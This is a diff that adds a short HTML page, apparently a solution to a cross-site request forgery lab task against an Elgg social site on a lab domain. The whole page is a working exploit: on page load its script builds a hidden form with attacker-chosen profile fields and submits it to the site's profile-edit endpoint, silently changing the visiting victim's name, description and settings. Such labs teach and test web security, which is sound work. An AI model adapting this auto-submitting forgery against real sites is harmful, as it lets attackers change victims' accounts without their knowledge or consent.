@@ -1,0 +1,32 @@
+<!--task3_index.html-->
+
+<html>
+<body>
+<h1>This page forges an HTTP POST request.</h1>
+<script type="text/javascript">
+function forge_post()
+{
+  var fields;
+
+  // attacker fields
+  fields += "<input type='hidden' name='name' value='Alice'>";
+  fields += "<input type='hidden' name='description' value='Boby is my Hero'>";
+  fields += "<input type='hidden' name='accesslevel[briefdescription]' value='2'>";
+  fields += "<input type='hidden' name='guid' value='42'>";
+
+  var p = document.createElement("form");
+  p.action = "http://www.csrflabelgg.com/action/profile/edit";
+  p.innerHTML = fields;
+  p.method = "post";
+  
+  // Append the form to the current page
+  document.body.appendChild(p);
+
+  // submit the form
+  p.submit();
+}
+
+ window.onload = function() { forge_post();}
+</script>
+</body>
+</html>
